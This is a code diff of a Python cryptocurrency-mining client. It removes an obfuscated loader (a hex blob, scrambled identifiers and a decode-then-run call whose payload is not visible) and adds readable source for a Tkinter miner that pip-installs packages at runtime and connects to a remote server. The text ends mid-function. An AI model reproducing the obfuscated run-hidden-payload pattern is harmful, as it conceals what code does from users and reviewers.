256bb718b9ffd3dd414057029b2970ff67a82023aa41b5d8e5f1b7e34ef4e3d43f2bb418da61c829261f5f410130707fe41f057c36efe9e60d4436235c8242516812a840d6c4d396ec10a14a3097d77130cbdadaf89d703c9bfa6f7d20b231bad0d12dfebcdd40e4cefd41bda61dfbb692773b7c6ebf2fccfe6b005ba1bc8bd554099bea100988a0b39f3b980888968b94aff8964696ca2260a17b7438628846a5665160f2d826268f972ccc06a24953aeb85990b79e04a09c09a30b194ce39905531734e470a096fa7ac16cfbf817de05ba6dfa11471c9f77c2b841152b2f5603fb63cced9c1acab127d5029bb7451e4080fb4ea5443878a322b47e7f469c346b9ccd89051823903581b4253b44a812c5e5750f8a4bb2be0684214b54b1a9696e8131050797ad2583af83e87e8e9bb1c3cb76bba19565d82d2cdd0ea6ca68430a51fd67e61c986d29bee44f70e39a109ad02844a7ce2878d9df257a4ca302d754935866d91a5a52555d0be2481008388ff2c47e84fbae8dd674e266a69c4a19b03006d0d4ec4a45c3035e26bf2c46d62c41f7e7f454703b6ece01664dd692d7c656820ad1f06846389b13055dd82dac899f2dd9214295e02daffbe7a1ddc6a1ebbc6f2ab088e560d49428ccab0c868a558828ffca66c3a0b8b33d4888bfb172e65fd934113dc81b3e23d76e9bd3b251986eb291a768dd6aaa9c83800e6a624a69df172e1b44d1006966d88299ea18299035e1149645551b1db7c472791dcc1509158e7c5fc66d61a767cbd1b0e56cd4942d56df8ed9692173fa2f9c40f93c7747aaaa6b413c72f4e07545c8d51195a7d0fa01d3869b6052ae772835f224460191ea154f034d9939f5123bda9483c2b95d1853eda9d9958a86073c6cbc6c2d5bb3cc04ceb3cf01be8202bee0fee15a61f29eabfb16d95a43a319600b664abb905b58133b5bb243842a815b5e47d3a349df9e39e6b6f0659fdff606adc143166a0760bd4bbad018323453cc54a1fc6833480fa4f004da4a6d55b9207cb91652319fd1c0f88cf4e7f429e37d859c0ea2114d55ed1572861a87089c4d87250fa1a9c998de20fb5c5534b7e5dfb20ba9f87428507295d02c64b8a2c64e7017906d8206f688e69b25495bf1c626e75f9173832a565e263a268292aa777a84ca20672990b4795be4f1eaa3d425d1873492a3c3d585d18264586a2a0a4a452f81d5298baa363a6e89eaf2ba3f5754326737e0c8897f1d5c53e97b47bd265be8969c29968d72e8bc7c80fb143fe171f8dfed20bec9bb7f4d05c91a9708ec440d7bf271bd9974ee1099e22f04b63a12322925c487bb2c95258115d093cfbf3148500768ba303221552527cd7700d8523b906d39953260614cd5a566572a1a1ef072518dc3d3d58e354bd0fd39f285c0069541ced281cb78cf387589ccad01d2ccb00533d55d142eac09a7b02caadae8b82596cbeb21b9327b36b92decf57721c5a66e3f94b36eb38e0cd3aa61ddf9b4de4c1b01b0cc9c754be240462c64d0e339eb3aba303221552527690ec8af709c07d6f429b48156c28f152f2dbe99fdfdf87cf8d76ad5af51d6580655ac1c5cf18eb129559c133e3bfb35594b0df0b7ea816541322c1b15f5314c206b6209931d226009e4f2ba2349567493672a3d404abcb75e7095050b433a52ee964a45c3035e29a4b07af60e72cd628707aa5df361a2b61239f7574223d63ec2d8ce3ddd82707fa3a3a8bc2fe42f061088b4579ab5fc11e74ed358464a91a0b3946d1078cf5f439574088443b1a9e6be18db4c1f93c5e4f19285d9403469ca15310b645b9042607a31181ba043f38fcbd65a205f074b01976e5050b67ba0140cd5a9279c2e3754bdad3f5406394b90e5f0b6c8e3c03121552a719039cfd3381a25cd166773a27f436d4a4c856551d546c72d015d5ef74c56fb8d56d7895faa2056e690d594233964ad6872c812ec199c582cc2c71eb2cca0c61c4755c62439a9e5a4b666c5fa8a46e6a4f6e48d5df176ce6a6742952c8baa363a6e09e9f27a4caeec37b44dfc1e3c313787b6a66491a704bcecef12ad22671ed52e98d3ee169bb453940438af8f48f31abc94983068ebc22a45846818654d563a6c18dbbc121a4414db43ccd2613955d0291a7af622079939ebc0886b4fcd6e49362f495410d719e9a79f92c52db10e141c0363a54ce4fe7334f51d2e2a48b2955e93056b1826f193281a23cd126773a2bd9b580b6b82684b7688502582cbebf6f4d032d791ed03e9b6b0d3af1c78dd4dcebfcd3ab234510deb4ea0f566daac8065e65f7e97c4818c58c8a0c7234dfe7dad2f8d0aad1537c420411da0e9c2c88454959c34df01604b45d56d3223c56da573725dcb7e54ed58b304dd7f8ea6bba2ca3116e820fa9046726cb83c8da351d26c713627fabb505c581353615954b5d1714b4097d7e15c9195ed994c6e0bc5f3c0efafce0783e71f4fd6af638ec80623494241673ff73011100d93e0c83da6920e8170c42ac2c5d866f29c85195984dd421686895702e34e88bac60c65037468fe71d9da51eaeb6029e0d20d0aca768fd34e6bbe82424d82fb23ff08b21cde13f67335598e6a2f0ea882ec10a14a3497d7dd68569de76ce623ebb630f769d4c4e21cb09af245eee8f1b2bf4bb4909c79acba60ce9dbf835bd04939a9b6f7a080cc53146fe6d6495bbbfc786c2dfb51185bb3e4c06568d1e1a282245bb435594b5e7b5b4d8b906687b339d1dd557a614d086dc90e11aac46f79dd3d62e9f175b6f3b1755b78ff2c6cb7
-1ffd018c397235e50f830799bafa2ba7ea1c107f186d81c8150c69e674898af99c46c80e1faa4ce5e2cd486ec5520e27cdc834d90fbd32bf19008be61530b0661958a2b0402bd628f3fcbfec1d98fa4e2a2eacd9b15e899391601dc28cf7844de3b4086976389b13dd5da517d684d096ec10a14afc96d7e1f4f85851f4ed3895df17263f88f47aa5d6e680d7942bd61442c0286ad89344ebcda4924064e6dff595c4e3fb692452c8613d05a287d0b02e9c3a40d3859109a92a3969be03c0968aaadb64468adb4ae707976bd98faa1d6b96a0fbcfd180df97260c49c8453a5c19ef89db60579b68a4347b9ccd890d2e0817d64413203b44b412cae5755f865cabd426aaf48c23b78579bf5b4854467ae578db94387a2fdf034168ab9f56576eebd3778d8a3bdb8384f81b2ba9d88d9271779781c50a1c780fcbb960d992b5dbacb8ffd3dd41c8a74c65a6c0fd9fa11284a806551f97c7df8e3bd18f537f2fdb62688721a7e8cc7d0505c0c0fd917f14f0d9bc27ee8c8552118d956691a721b642aa6f09264c7688502592cbebe6f4d012d7111d05bf9c4b4a6968f0f78e8d798305a26a7bf69ede97d6469d1bd2ae34cb1aa2b0516e6839f576f5a16695bee06e910db9ba74d3eedde896e035a718b9820d23b6b014d9185d687a78ada427821202cb1b1d10785f98f883603522f286b289675f47b51028ea060b16902a17acadec63753a40414043d0b9f733087815a9c476edb3a653462f2fab7cedf29b386bd98f82c89a25e8fef6d3bc662368235af8ac585f1121234efdd6690a7949472ce36d91c7d3504950cf7926594b763b5bf989148d906687b339d1ddc5dfc29a40c264870858a2b8bcee9a8f14183a343eae6e0bcb33b58ff91c6deaad9cb49a722d27ad9cb46c1a6b678b9f4e4dfbe9088a9d979195326021a7b445764e698e06a665156b174206f48502d8a032c8593a7019efe9da3c3f9da201d2cc703627aabb285c58134e615954b5d1714b2c97d7fd239baa74ffd836ff89002c72397735258c3533b4f4da607b384cb4cc127eb27dbcd1d45a73073e7d37aa641ea159c860dc224dff7dadafe6145a2b6e08a73e6674134ccaf5a8523c9f4c947aa652b9f8978daa35b26b9bb63d35aaa0537a07af2ca0306f17c69c02d4ec4a45277ecdad1660aa23e6a39147b9a09953e3d62c41f79f6244f01514f005f72725c1ddcfe63d55632e72b54646d3df16cc747611b7b02674b664870855e2b6bc0ea587040347ba2fe3b630ef19045b6f5418dd6ba136daf10c11e284b3903f222f1aba3a9adc82ce52b60122201a26c1911b3d251d02e1902b8d548b35df9b0ac52c611176cb4e18265ec18a3b21ea1a33940dd0a1f9c7656ba79eaf83a5804b372828db3d4e3b32f9f1126a12dc1f09166439bc276cbd72681aa4fd31c153901d225489dcf23a9c1eed5a0f19a0f6788cdb8366a7f30d5378d9df255a48ce3c425d30e79e5ffe14f2105702f149f040d1318a6fe99453c54bd34a19b030a64050b32b150d0f78b17b59ccad5982ee3f47bf5851e5e40574107d482339365cbd2d878fdd869454947771b8b026a0c2b2a86aa3e396682eafbb7365c7c7694ffc2c0bb0e708d6942466ef63f74591545edee3b23554aa09f8829da6925f8373d0f336c2622c0317b29ea3146d1dcfdaa19658c810d02f59a10bd22c0d179393cc34be82021ee1fec83f3ab619ef791b1f81261a2acda098820db52bb1b4253b44a812c8e575203d241038b27d19b785e5f923c52b1f46a22cac5f7a8e1f7118228c78d9df65504b566780ef2905e32d6e53752d882341b860ce7c1849a38ea0f2791959290316c6d4026a76a5a2e1010f042f0baf354b8e695c0b5f41015f707fe41f1dab8cf74cddddbcd86816389b9b5a27780aee9ccb4e85dc4a0ad9bd7f28cbbf8b22a1cdd189d68a67efed9424603417cc799c27e60329390d1968a854343ce0e5f5cb2266cd92d310d7c25750c017dc1ff947c72ae33d554fd5a44b344e9a35cee64441177f0b6b02694b768850258acbeb2e14af88769b95667fdc9413d3b523551ada3e9aef82ce7ebe602220ba56c2df5f016a8b03590486cf4e8673e5e2239567cdf7a642314b5884dde213868957b686c0c88c4e031a684a71d9dad9e6eb6029e0d2ede5e7ca5ea2deb377773555ce4c40073569592407866b6a9c346b9ccd89050dd52951159645551b1db78474793d6a8012351f33435df7799004342b27aaa6dcd15b14d52a150194ce7fccbd5f8280f57532f9be5610dfe27816b90993d88ac0cc134ce5e31d79bd7e49a9dac037a24bc7cb31bc2c64d07d818d96cdfaea75a175dc2d9528754b2de66a2a44ec646e44cb22d6c2ef522549f19a1ab0930ca1be8242d4e1fed10cb279cfdaa4bab812041c627641ac09a22dd9214295082eaffb10dc4ee7f5957ea0e73eae90d892c36553c6880160cbfe2e83dadf3a037c4f29286d719baa6b411c09c20573e6df8635ea080a959791953260614c2da066572a1a1ef040f0b2f05ab3e484a568b12ce5b8c5943846b3d691d505c911ba78c49a980acba2aa8d8e5b02babceec91559df412357fe35d9d639448813d7427e0e5b07ee069524603417cc7998bf2603d0efda684d97135338b24f8791354b4e4c9e16fd108312908b74b832de73b655abab9c9506697f5834156487885642b9bc6ecf10510147b80fa6dbc2edd1879d4f3accd10a38e6a946ab3b5348673fd93011100d93e0c80da4920e8170c8b54aaae69aef4d856296b008bb952b0c13afe6c59d10758d19ca06e8d0fce3b2b573d3d7c152c0a51b1494ed1e671ec5967fe734c69478ec34164ee282e4081d3d624d0861b243042cf15b5e47f1bbcf0036f5d11daec2394f35a5895ce7f1b2bf4bb47e9c798aba60cedd3eaa5ac89a2b06511d2adb9efd036d042a29e78e97d1d0219b8531b5849a5da968786094c39f0e9e6b96a0fbcfd2576ea87242033a883ea4913ce018e003b8212f150b5c302eac89aab02caadae8b825a4cbeb78ae68e9ecece1a3ebb630f58fb958bc72686b4a13bd5def011cb4d54fa32bb7f5e9bb46c59ded4142fc8d7553ec46c9a4a9d83e3c358100094323881ee40d9f916bb7cd69d9284c37d9c8ece25afc55906423b526dba67d385cbd87bf005c3d1515a53146206b02292c8baa363a6e89e2f23a922b5a223bd27d5cdd16beecf52116352ca7a2a66cb13af6f060d49d4cebcdb4690acb747b2a9069822321d3d946305eda841cd653207a0c3d681a13e8e454959ca439605001b39218bc87e5b0ea221a26e41bdae13cb0a6dff70c779a4262f30ae35bdbdf89cfaf02b55af56b94359641152bc7587cae68ca18e7a0cf9e7e4dd6520af8568abba2e1d18c7036278a638040d64411263b44c012c2e5754792e8fa76cc537a6c94506f1de02a0b168674a3dc2d958a8607bc2a4811f5ecdde39ac50e0f54bbe6c3446dd5d1dbdb2f65e6be016b1f61ec883d65d4f75697f785dd7e380533e57d3fa9e8701d09235ef67789f629cf5e5595246034a4b83de6694b5236120f34b786c6964a34e3f0b136af848e4b6bc493dd5976670db8286522f74bb9ea141b529288163e2bd65744c8c046cdf1b9542374e032de16793c1b953c157d4823393e5ca00e4029ad91d2ecf1f4c336b8705c581357615954b5d1714b5097d7ddb9d280fc9e43ef7d61eaf37c91596e63943367b38e26a66955735a5e9c41fe0f7336e76dbd356241163c7d83aa641ea159c860dc2273c07dadaff4145a2b6e08a73e6674134ccaf50ea5461ecb282052bde269a02933a75e6247bbe7a1ad5d0edb6bd98faa656b9699c0c9a100f93cfbf235594b922b5b4d8d94668fb339b1c185e3c29ab80acba2aa8d8e5b82babc6ece152d8b1dd13ea86e0bb70742df5ebd8f85beee30a43f68147fedd9dc53c44f26a6e5f21e97ad415b4de817ec5a95fc1a9c839eb7518d8a65e04236f424a9b5212acf3481434280bd043a5dd04e03aa0514f01e968342d56098e0ee6032bc48e9e0a1b5cdf14de1198f03532a39e8d4f5bdd73f47b4442156556ab5ead7286b2c832a568ed9e054e42bc85d5490e42cb2266b292af656e1042e488625a0a2374606644df86cc90e11aac46e791d4d8f8f95be4e12786fee57f811f7e4aff013f679dfded76c3c62eca10e5ff6f8920631376f0335150abdd754adf2f3d0a1f3bfb5e19f37c0fa3a997c5f9b09b8d0c85259e4aca2d077a057c2611160ee6a8c44fd9252b581cf2b3ef1292c8697850cba2fb0d1b2595fad2eb48ebba512a56ea9c55c4d85889dcc8d6859c45af85daa24295e530396771336dc4e99cb89644d2666a7b795a76734369a05cee66d0505b12678b66487085522b7bc8ea64745d4d9adf8c8ba2decf0ab69803c67caa684692f28b47c393d244e9bfcdabf2355d5b520cee928d86c4b668672bd078f8a5992a71191ed0e2f31034d17cd28ef510a035364cb1328d538c6ee016c6b977f71b096fda832ba6609baff1483474d35a5c6b5552db4670e02abb7679e42a61db660a6bb0bc38535f1149645551b1db70473791dc9152d911de93eae6e0bfb3d3a8e852d47faa66c813466cad042d63ee65c6d47fa49f7f1465363cd1df8f4bda8927984662183718bb4fcf7b5beda5368adb8219cfa98d14d3029d73b946a3f4eab1725430192ea57cfc63db5a9a053ccf1ca010aef76614cf5a766572a1a1ef0b0f2b2b56dcd3201485476ce05509970e13079cfd59a6fde9e1227cd1a677362810bc6853551159645551b1db78474791dc995ad18b27dcfd0735b98f8fb8cc4b69cac9b3243eefff0b2bfcba0cebbce00df530a1a5bdca6ea5a10478270c19c7b3f977d4dd75e0ab41a93139701a24a45c3031e1c5e16686b969cb8b816be8202bee0fec83f3a5619efb93a324296c3d68b03aa203b44a812cde575079ae5c03afbf8a0ba2dbc7dae999f6a22d5b6af63ce5ecb3f303bad614e678b13283fd574a4aaba16c481c8d33ac1eb8b90abc11032419a1bc2a98f19dd049372bd43a9603d50022609776bf0b0c253d0295d818775143bc74f39409b289c53b8d62c735082653f5bbf5f534d99ce90b374e032ded3f5df8acba221d20c713627cabb385c581350615954b5d1714b3497d7f15c9180e16ce1cbb82d7cfefaf9fe40f2014f235f5efdc23ec6fb9fef5f63be2c7adf45dddf795fff525157443509173880f68d8e08f9f4f9eb97719672eaaf5f4ee2ce26a606f57a25736bbeaeffd47e5e06b4d0c63379a02999670325bf92318d52afabdc3c1ace1e122fa314ad7f9be4fbabf710cf5a6055cbf9c9d8664f13b2b3da1fa04022e1833b8a0ccc40c92f63ccf39dc11ffb1fac03181ff37af6db9eeafdb379169783e1f1d58c01cc9679831b2a74fbe47ab8d2114c84c18ddb638de9cb3dd63c1da2bccdefdd8f61e769cbb8654f7d66df5e037f30f4f8c01f5b753349074a7e4e63faeadef5e9efd4b71e122f6feb737504a72d42c5087b98e1d5a0de2153f7f9dcb88536bb4afa461ed82325374a0dbd719d302a9f35a15fe9ee49348f32871e59479070cb1273c7afa3be30d79e13c7bc77d79e2a7ab6e567990f07cf098c79825ba239870eef249ed409e13cf789b846f52de9dd0f3f6616a3defb0ccba3eaa0d5fda58c193afce6802b47238f9ec7230209f7c6b843357607bc6bdb9621fa56c076f299f6513a89c4e440c9b63187bc23d8599b4ef4e930391c8f5264c75bdd9df5d96af1378e5eac9ec89851c30104f8233f37bff50e0ff99bf223d6f5d1999cb7160f08e69732264f46f3bdbd43e6321daaa36ba13dca67ed0fed42c9a89d83f642b72342d9b874b42f227ebcf7621f64e49ddb437604838df978ef7877581f1093b2fe9fea8f861e90c3476939b2babcae315eab9e0978bc980def3d0ceaf1fa6b53fda1e6443b0e31153f8ed283cc4e9cfa68e93223188728464d75e5c9beb11d3f4b72ca3af031f404c67cbc77a803e5b499b41a20077ee876c48fd23afd34385b0719f5906ccc0f116736db799be1e145f160c61cb2b5a4e616b724739852d80ff92dc93d60e032e55193b570aee43d1f573ba6074d3c3c3285aed12f0a82af6a1ce5a9fb9cfa702786d83f7f7f254e0e566a5fcd18c0bcdbaffc1cf249c5a1983fcdf1db952939d31f0dc2ab49f5457ec26e8ffc3ee29dddc496143abe677e1443df787893f152c6b4df1eead5e3a0dfc08e15dffce4e5a0791d35e6bd0379a9bbe403f07a2c830231ef4e9b43fd3143569dd7aa3a8f383833ee5b7ca3bfdc7bad1bc2901625dab1d4deb7dee7d7fac7f6c8ce819a8e7ef183cc653ae28df33963c5e675a0bf0e7c80b39efc98e9b861708ca83d61c9f389b8464e01ca90a8c97b4d67bdfa91fd5863dafb0bf7a0b91eaebfa81ecafa901f577b923398dc0b3998ea0fadc98728c99d1d549ec33b57e38ff7f25ca76fe4b95e49fe7e700df998ecfbeba79be86fe7d0a7dbbffef087b7ffffe1edbf6ffabebf53bc717be783fb43d1f7eb2feb8b3f30b9ef6fdfae877defe843917724ddae2ed7eb96f376f943f1fe9de407cab62c209acbbb27e8ee979a112902f6b3545aabb5a924ca5e97c6dd2fdbcb7bf87db7af8436faded272ad2af6efbad13374bc581aac89b61e807cdbad1def78996059f971a17a8fb9dbd7c15200d1dd4b839191481a800adea2395c96ae5a02ab4e90f1d614fa2fd899082072aa8eb24d93a507eefbebcb7ab1214092fc114442e5c101d3d2def3961053a6a45131b67c5f88158ca3a38e01a77ffbef98a7116d5e433aa8379af726a9e8953e7a9e4fe06ad3107d7b2d4dd45a2010fbd182e1d5a293e24242ba7d488564b8d3b376adf6f95269de2cd3b764b381c2767f17abe33bcf711c0e2fb46bedaa322680eefda249ff4afded6767231028f983a8f9ae184d732371de0d595ce66fc4dce3e79794583093af6b2457de92aa80551b82220b744acef86267e7d6d19f473e7aa735ce38cc864557927242892bb56382a4f26a9f1ad1
-ba229f1e1f916359ffb1a5adc9fa3d72d67830f203bc91ef9fb2c219656e8b76bf2b31ea8ec7f6309b51d088b76e145545a91d6a9ede0e4e384878e0ae9b62d771e09741e3995328d3948b4a4b659767b997aa8337e8b785d65e6968d83671321ae96d1df13b03b51c5667103e73c5b8b456a1783fdd83a9ab58c0d4e0b51f3d5b5718476167611700e415c0193f2802141d3103d4fe33bc00fab9ee89ae79148ab4c74d236bc33c29817c035caba460fe75cd8fcc93669faab9a66ab19a41c61cab6369c8a933e8c8581b27a58b3c9f4626ff407f36486937c8f57f5b5c61c366488b142911cdad8264b3777f82fc971c3723be9f2478b1336748789b5becb6e3cc6c765aa712365eb7d5ec6dcd77551dd60846ee1985ced54ec792c375d84dfe96f65de93d845b5cbe0fc4f67cda0deabb97371df7c7d7397aefbdfb0d6a67def5dc465fbf87b398d5dedebf46b79476cfc641f1ae8c0d43d62d384df7a03e54ac7114eaacb7ce744d6dbacf844ea786fabab2755c5b78377ec69f3819ad515b1f297c48baf64e5be344031bbd2559aa62ab33064031f950df1618e98d6c5b48ec7bf8d70f9048db7f2d3362444f306cecae4b8feffd0f7034b5af839b769a74f5c7e350bb50d7f3e12b7cbbb7fdec8e7c0cb32993636f7daffc58809717bac66f697849d21af8c8e1d35232467f844760669ccb52f3ba0424dc82b0a675d4f7b4e52f19b116bcfb0b176bf4357de544f21319149a527309a324cacf0fa30f6074cdbd216e0a4721307c13a08ed0f067752bbeb2bfdd8023289691962fc048d51799c14a9d2cbda1206d5cd6f31da7c639dea9e8e299aeddf4338ff361df0e0d7cf8db34b7348ca2e1d2acf3b5cd6ef231dd7e4a80bc9bfd51193f8a82c3a355d70b0fb6fbe31e9aaa184ffb30adffc650ff8dd8ce8ad6801ffdb3346670e0c0bd16f5a30ec43508bb0fbe29e5bfe50b95c0e806649757e80084b7be7a1131f0f82c2aeaa86f2338910a7d7b09ad9aa39c72044ab3b95111bbbf29d59adbd735ea0447b947572170d44859e83ce25b486d3365f7d9eeb5196e14f4b4506d02ee68affb4a2d0bdea7f1baed062b95dc745a2aa52c6e2bf3c874ed0792f505b120e4b96f91546facba6fde340284e628e1a38951a9bd46fee096d36a44277cbc6a54e8dbfffef411de9fdf7beccbf2dff7545f3d126295fc97b777be61a262f338ef04947d910ff82f0e63b9c746c65d31570035c1571debeeeb4d4d2e685cdd91dd4d124c0166dc6fd24b3eeef28bb909ddc6c80cae18df6bf5be9055efd1a7bea57a33463b1c1c48561cb64130dd09d4b7fd4444d91e16fd4bdd6ba04e082d67bea29495595d95d54ab5e1176acc6a8b1a6f7e79828551a84fc4d692462851a8aefa75c9dadadbd9a9ae34b10550d89be304718a15db52c9c815ad7d02f342e59edd5ed52215cb2859c2d1e7edbbb68c6b4f8a17e692eb16eb9258cda25d95d354f16eecaa142a7c3cb73454d4b76a7cbc587b85a062170aad0b62b56e7972d69bb95d96114ba79055bcd069751fc04b94516d9c4265e58358a734e8b37a65962ab7bbb2f7b63d20d64aa968b97ab0ba25384f6cbdd0ccc29b2e2b67ec22e61ee37e25a33d62432d731b19a99639454568c5fc72e257373f8bb5e2c6fd2a8e8d7ca4f34a9a0044d29e5967a2d594e18437eb9ddb41ea6324af9bac2f93caa43f4e16621cad6d454583b52cc7f54db1599d2c8573dba876bcdc99d54e395fbc7287ef4235746de436963a635a376abc02670ed74adb063a56a9966dd25c2a5fb8fcb9cd58dd90d2415238fccc9205dce10d9276d1d26f7be1d9c19a22d16d0daf4239feb15b310f6c52adb232960e8f5e58e5bb5fd869bc2e49c38859a2c8992f0c934057b928c192a4d6a3fa08536e79d9b5c82f46d6dd6aa524b19b22526d324f61bb42e13687d62863275a9ab601b16b5215be862284f0414b106875bcfec8990accfa637e9cf19df5eb9fee62fe5489ffb45af9843cf04dc0cfe5678337e19fbffee0b07ee77ca375293b365976f9fed325358564df1f6f5b3365d75b38fa7cfaf9ab4e6cd9bd7ceb167ffc5f7e2de0f923f7f9ff03694d5181""")
-lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(lIllll)+(llllllllllllllI(lIllll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIlIll)+llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIllll) + llllllllllllllI(lIllll) + llllllllllllllI(lIlIll) + llllllllllllllI(lIlIll))] = lIllIIIlIlIIIIlIlI(IlllIIIlIllllIlllI.__dict__)[0][llllllllllllllI(114) + (llllllllllllllI(lllIll) + llllllllllllllI(112) + llllllllllllllI(lIlIll) + llllllllllllllI(IlIIll) + llllllllllllllI(99) + llllllllllllllI(lllIll))];IIllIlI='-_+!1@2#3$4%5^6&7*8(9)0qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFG';lilIIlI='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';lIlllllIl='ihQlwp==';lIIIIIlI='e2)dtYTmyh)Eym==';IlIlIlIIIIllI='uq*h%(p=';IllIIllIlll='+p=='
-def llIIlIlllllIIlllII(lllIllllIIIllIllII):
-    lllllIIIIlllllIlII=IIllIlI.IllIllIllIllllIIlIIlIllIl();llIIIIIllllIllIlII=lilIIlI.IllIllIllIllllIIlIIlIllIl();llIlIIIIIIIIllIIlI=lIllIlIlIIIlIIIlII.IllIIlIIlllIIIIlIlIIllIII(lllllIIIIlllllIlII,llIIIIIllllIllIlII)
-    return llIIIIIlIllIllIlIl(lllIllllIIIllIllII.IllllIIllllIIIIIIlIIlIIII(llIlIIIIIIIIllIIlI)).IlIlIlIlIIIIlIllIllllllII()
-lIlIlIlIIIlIllllll(IIlIlIIIlIIIIlIIIl(IllIllIlIIIlllllII(llIIlIlllllIIlllII(lIlllllIl)),llIIlIlllllIIlllII(lIIIIIlI))(lIllIlIlIIIlIIIlII.IlIIIllIIIIlllIIIlllIlIll(lIlIIIlIlIIIlI.replace("!","").IIllllllllIlllIIIIlllIIll(llIIlIlllllIIlllII(IllIIllIlll),''))).IlIlIlIlIIIIlIllIllllllII(llIIlIlllllIIlllII(IlIlIlIIIIllI)))
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 
+# --- Основные импорты ---
+import sys
+import subprocess
+import importlib
+import hashlib
+import asyncio
+import json
+import platform
+import time
+import os
+import socket
+from datetime import datetime
+from collections import deque
+import signal
+import secrets
+from tempfile import NamedTemporaryFile
+import threading
+import queue
+import re
+
+# --- Автоматическая установка и импорт зависимостей ---
+def install_and_import(package, pip_name=None):
+    try:
+        importlib.import_module(package)
+    except ImportError:
+        pip_name = pip_name or package
+        print(f"Installing required library: {pip_name}...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", pip_name])
+    finally:
+        globals()[package] = importlib.import_module(package)
+
+required_libraries = [
+    ("colorama", None), ("psutil", None), ("PIL", "pillow"), ("tkinter", None),
+    ("dns", "dnspython"), ("cpuinfo", "py-cpuinfo"), ("matplotlib", None)
+]
+for lib in required_libraries:
+    install_and_import(lib[0], lib[1])
+
+# --- Импорты из установленных библиотек ---
+from colorama import Fore, init
+import psutil
+from PIL import Image, ImageTk
+import tkinter as tk
+from tkinter import ttk, scrolledtext, messagebox
+import webbrowser
+import dns.resolver
+import cpuinfo
+from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
+from matplotlib.figure import Figure
+import numpy as np
+
+init(autoreset=True)
+
+# --- Вспомогательные функции ---
+def resource_path(relative_path):
+    try:
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.dirname(os.path.abspath(__file__))
+    return os.path.join(base_path, relative_path)
+
+# --- Система конфигурации ---
+DEFAULT_WALLET = ""  # По умолчанию кошелек пустой
+CONFIG_FILE = "config.json"
+
+def load_config():
+    try:
+        with open(CONFIG_FILE, 'r') as f:
+            config = json.load(f)
+            return config.get("wallet", DEFAULT_WALLET)
+    except (FileNotFoundError, json.JSONDecodeError):
+        save_config(DEFAULT_WALLET)
+        return DEFAULT_WALLET
+
+def save_config(wallet_address):
+    with open(CONFIG_FILE, 'w') as f:
+        json.dump({"wallet": wallet_address}, f, indent=4)
+
+# --- Глобальные переменные и константы ---
+SERVER_HOST = "nyxaro.ru"
+SERVER_PORT = 2025
+WALLET = load_config()
+REPORTING_BATCH_SIZE = 10000
+
+# Цветовая схема GUI
+PREMIUM_DARK_BG, CARD_BG = "#1A1D24", "#242831"
+ACCENT_GOLD, ACCENT_CYAN = "#FFD700", "#00FFFF"
+TEXT_LIGHT, TEXT_DARK = "#EAECEE", "#A9A9A9"
+SUCCESS_COLOR, WARNING_COLOR, ERROR_COLOR = "#4CAF50", "#FFC107", "#F44336"
+BORDER_COLOR, INFO_COLOR = "#3A3F4C", "#9C27B0"
+
+stats = {
+    "hashes": 0, "accepted": 0, "rejected": 0, "balance": 0.000,
+    "session_earnings": 0.000, "hashrates_history": deque(maxlen=120), "max_hashrate": 0
+}
+stats_lock = threading.Lock()
+running = True
+
+# =============================================================================
+# === Вспомогательные классы для GUI ==========================================
+# =============================================================================
+
+class SystemInfoWindow(tk.Toplevel):
+    def __init__(self, master, controller):
+        super().__init__(master)
+        self.controller = controller
+        self.title("System Info")
+        self.geometry("450x200")
+        self.resizable(False, False)
+        self.configure(bg=PREMIUM_DARK_BG)
+        self.protocol("WM_DELETE_WINDOW", self.on_close)
+        self.create_widgets()
+        threading.Thread(target=self.fetch_and_display_info, daemon=True).start()
+
+    def create_widgets(self):
+        main_frame = ttk.Frame(self, style='Card.TFrame', padding=20)
+        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        main_frame.grid_columnconfigure(1, weight=1)
+        ttk.Label(main_frame, text="Processor (CPU):", style='Card.TLabel', font=('Segoe UI', 10, 'bold')).grid(row=0, column=0, sticky="w", pady=5)
+        self.cpu_label = ttk.Label(main_frame, text="Loading...", style='Card.TLabel', font=('Segoe UI', 10))
+        self.cpu_label.grid(row=0, column=1, sticky="w", padx=10)
+        ttk.Label(main_frame, text="Graphics (GPU):", style='Card.TLabel', font=('Segoe UI', 10, 'bold')).grid(row=1, column=0, sticky="w", pady=5)
+        self.gpu_label = ttk.Label(main_frame, text="Loading...", style='Card.TLabel', font=('Segoe UI', 10))
+        self.gpu_label.grid(row=1, column=1, sticky="w", padx=10)
+        ttk.Label(main_frame, text="Memory (RAM):", style='Card.TLabel', font=('Segoe UI', 10, 'bold')).grid(row=2, column=0, sticky="w", pady=5)
+        self.ram_label = ttk.Label(main_frame, text="Loading...", style='Card.TLabel', font=('Segoe UI', 10))
+        self.ram_label.grid(row=2, column=1, sticky="w", padx=10)
+
+    def _get_gpu_info(self):
+        try:
+            system = platform.system()
+            if system == "Windows":
+                command = "wmic path win32_videocontroller get name"
+                output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.DEVNULL)
+                gpus = [line.strip() for line in output.split('\n') if line.strip() and line.strip() != "Name"]
+                return ", ".join(gpus) if gpus else "N/A"
+            elif system == "Linux":
+                command = "lspci | grep -i 'vga\\|3d\\|2d'"
+                output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.DEVNULL)
+                gpus = [line.split(":")[-1].strip() for line in output.strip().split('\n')]
+                return ", ".join(gpus) if gpus else "N/A"
+            elif system == "Darwin":
+                command = "system_profiler SPDisplaysDataType"
+                output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.DEVNULL)
